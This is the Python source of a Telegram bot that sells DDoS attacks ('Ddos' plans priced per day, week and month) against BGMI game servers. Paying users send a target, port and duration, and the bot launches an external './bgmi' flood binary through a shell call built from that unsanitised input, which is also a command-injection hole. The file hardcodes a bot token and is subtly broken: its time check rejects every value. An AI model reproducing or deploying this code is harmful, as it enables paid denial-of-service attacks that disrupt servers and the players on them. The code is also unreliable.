#put your bot token and user id
# all admin command are change. so all modified cmd note on ur mind 😏


# CMD : 1) pip install telebot, 2) pip install flask 3) chmod +x * 4) python server.py
# dm : @Rajarohan24 if you faces any issue

import telebot
import subprocess
import requests
import datetime
import os

from keep_alive import keep_alive
keep_alive()

# insert your Telegram bot token here
bot = telebot.TeleBot('7405040191AAHXLdzqs4VZlRJFncNGIBkQTnk5N998')

# Admin user IDs
admin_id = ["6541124790", "", "", "User ID"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File To Store Free / Start Users 

FREE_USER_FILE = "allm.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget : {target}\nPort : {port}\nTime : {time}\n\@Rajarohan24")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0) 
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID : {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target : {target}"
    if port:
        log_entry += f" | Port : {port}"
    if time:
        log_entry += f" | Time : {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allmem'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['check'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "❌"
            bot.reply_to(message, response)
    else:
        response = "❌"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your User ID : {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    user_name = message.from_user.first_name
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🔥𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗🔥\n\n🧿𝐓𝐀𝐑𝐆𝐄𝐓 : {target}\n💠𝐏𝐎𝐑𝐓 : {port}\n୧⍤⃝💐𝐓𝐈𝐌𝐄 : {time} Seconds\nᯓ★𝙇𝙖𝙜 𝙜𝙖𝙮𝙚 𝙇 𝙇𝙤𝙗𝙗𝙮 𝙠𝙚✪✔"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "Wait Until Cooldown Finish ❌.\nPlease Wait 1min Before Running Attack"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 280:
                response = "Error : Time Support Only 280 Sec."
            elif time < 380:
                response = "Error : Time Support Only 380 Sec."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time) #cmd change kr lena 😁 [ line : 251 and 256
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                subprocess.run(full_command, shell=True)
                response = f"Attack Finished\n\nTarget : {target}\nPort : {port}\nTime : {time}\n\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24"
        else:
            response = "🖕 Usage :- /bgmi <target> <port> <time>\nCooldown Lag Gya Hai, Now Wait 10 second"  # Updated command syntax
    else:
        response = "⛔ 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗣𝗹𝗲𝗮𝘀𝗲 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗼 𝗔𝗱𝗺𝗶𝗻 𝗮𝗻𝗱 𝗴𝗲𝘁 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ⛔.\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylo'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''Available commands :
💥 /bgmi : Method For Bgmi Servers

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝐅𝐨𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 𝐏𝐥𝐞𝐚𝐬𝐞 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 /bgmi 𝐂𝐨𝐦𝐦𝐚𝐧𝐝\n🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️: Do not Attack more than 1 in 1 match'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!

Vip 🌟 :
-> Attack Time : 200 (S)
-> After Attack Limit : 3 Min
-> Concurrents Attack : 300

Price List 💸 :
Day-> 100 Rs
Week-> 800 Rs
Month-> 1200 Rs

If You Want To Buy Private Server Contact Us. 
🦋⃤𝗬𝗢𝗨𝗥 𝗔𝗗𝗠𝗜𝗡 ✮ @Rajarohan24
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['amd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['bcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)




bot.polling()
